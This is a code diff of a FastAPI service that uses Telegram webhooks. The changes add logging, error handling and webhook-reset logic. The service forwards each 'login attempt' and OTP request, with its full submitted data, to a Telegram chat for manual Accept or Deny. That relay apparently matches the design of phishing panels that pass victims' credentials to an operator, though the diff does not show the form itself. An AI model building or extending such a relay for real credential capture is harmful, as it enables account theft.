@@ -35,50 +35,52 @@ class OTPRequest(BaseModel):
     price: str
 
 # --- TELEGRAM BOT SETUP ---
-# CRITICAL FIX: .updater(None) is required for Webhooks. 
-# If you don't add this, the bot tries to poll and ignores webhooks!
 ptb_app = Application.builder().token(BOT_TOKEN).updater(None).build()
 
 async def handle_telegram_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handles the Accept/Deny button clicks safely"""
+    print("⚡ Handler triggered!")
     query = update.callback_query
     
     try:
         # 1. Immediately stop the loading spinner on Telegram
         await query.answer(text="Processing...") 
+        print(f"📥 Raw callback data received: {query.data}")
 
         # 2. Parse the callback data
         data = query.data.split(":")
         action = data[0]
         tx_id = data[1]
 
-        print(f"🔘 Button Clicked: {action} for transaction {tx_id}")
+        print(f"🔘 Action: {action} | Transaction ID: {tx_id}")
 
         # 3. Check if the transaction exists
         if tx_id in transactions:
             if action == "accept":
                 transactions[tx_id]["status"] = "approved"
+                print(f"✅ Transaction {tx_id} APPROVED in memory.")
                 try:
                     await query.edit_message_text(
                         text=f"{query.message.text}\n\n✅ <b>APPROVED</b>",
                         parse_mode="HTML"
                     )
-                except Exception:
-                    pass 
+                except Exception as e:
+                    print(f"Edit message error (probably already edited): {e}")
             elif action == "deny":
                 transactions[tx_id]["status"] = "denied"
+                print(f"❌ Transaction {tx_id} DENIED in memory.")
                 try:
                     await query.edit_message_text(
                         text=f"{query.message.text}\n\n❌ <b>DENIED</b>",
                         parse_mode="HTML"
                     )
-                except Exception:
-                    pass 
+                except Exception as e:
+                    print(f"Edit message error: {e}")
         else:
-            # If Render went to sleep and wiped memory
+            print(f"⚠️ Transaction {tx_id} not found (Render may have restarted).")
             try:
                 await query.edit_message_text(
-                    text=f"{query.message.text}\n\n⚠️ <b>EXPIRED</b> (Server restarted)",
+                    text=f"{query.message.text}\n\n⚠️ <b>EXPIRED</b> (Server restarted, please try again)",
                     parse_mode="HTML"
                 )
             except Exception:
@@ -92,11 +94,12 @@ ptb_app.add_handler(CallbackQueryHandler(handle_telegram_buttons))
 # --- FASTAPI LIFESPAN ---
 @asynccontextmanager
 async def lifespan(app: FastAPI):
-    print("Starting Telegram Bot...")
+    print("🚀 Starting Telegram Bot...")
     await ptb_app.initialize()
-    # We do NOT call ptb_app.start() here because we don't need the updater
+    await ptb_app.start()  # <--- CRITICAL: Starts the application logic
     yield
-    print("Shutting down Telegram Bot...")
+    print("🛑 Shutting down Telegram Bot...")
+    await ptb_app.stop()
     await ptb_app.shutdown()
 
 app = FastAPI(lifespan=lifespan)
@@ -119,6 +122,7 @@ async def initiate_login(req: LoginRequest):
         "type": "login",
         "data": req.model_dump()
     }
+    print(f"📝 New Login Transaction: {tx_id}")
 
     message = (
         f"🔐 <b>NEW LOGIN ATTEMPT</b>\n\n"
@@ -142,6 +146,7 @@ async def initiate_login(req: LoginRequest):
             reply_markup=reply_markup,
             parse_mode="HTML"
         )
+        print("✉️ Telegram message sent.")
     except Exception as e:
         print(f"Telegram Error: {e}")
         raise HTTPException(status_code=500, detail="Failed to send message to Telegram")
@@ -199,15 +204,21 @@ async def get_status(tx_id: str):
 
 @app.post("/api/webhook/telegram")
 async def telegram_webhook(request: Request, x_telegram_bot_api_secret_token: Optional[str] = Header(None)):
+    # Verify secret
     if x_telegram_bot_api_secret_token != WEBHOOK_SECRET:
+        print("🚨 Unauthorized webhook attempt!")
         raise HTTPException(status_code=403, detail="Invalid secret token")
 
     update_data = await request.json()
-    print(f"📥 Received Webhook: {update_data.get('update_id')}")
+    print(f"📥 Webhook Received! Update ID: {update_data.get('update_id')}")
     
-    update = Update.de_json(update_data, ptb_app.bot)
-    await ptb_app.process_update(update)
-    
+    try:
+        update = Update.de_json(update_data, ptb_app.bot)
+        await ptb_app.process_update(update)
+        print("✅ Update processed successfully.")
+    except Exception as e:
+        print(f"❌ Webhook Process Error: {e}")
+        
     return {"status": "ok"}
 
 @app.get("/api/webhook/set")
@@ -221,11 +232,18 @@ async def set_telegram_webhook():
     webhook_url = f"https://{base_url}/api/webhook/telegram" if not base_url.startswith("http") else f"{base_url}/api/webhook/telegram"
     
     try:
+        # First, delete any old broken webhooks
+        await ptb_app.bot.delete_webhook(drop_pending_updates=True)
+        
+        # Then set the new one
         await ptb_app.bot.set_webhook(
             url=webhook_url,
-            secret_token=WEBHOOK_SECRET,
-            drop_pending_updates=True
+            secret_token=WEBHOOK_SECRET
         )
-        return {"status": "success", "webhook_url": webhook_url}
+        return {
+            "status": "success", 
+            "message": "Webhook successfully set!", 
+            "webhook_url": webhook_url
+        }
     except Exception as e:
         raise HTTPException(status_code=500, detail=f"Failed to set webhook: {e}")
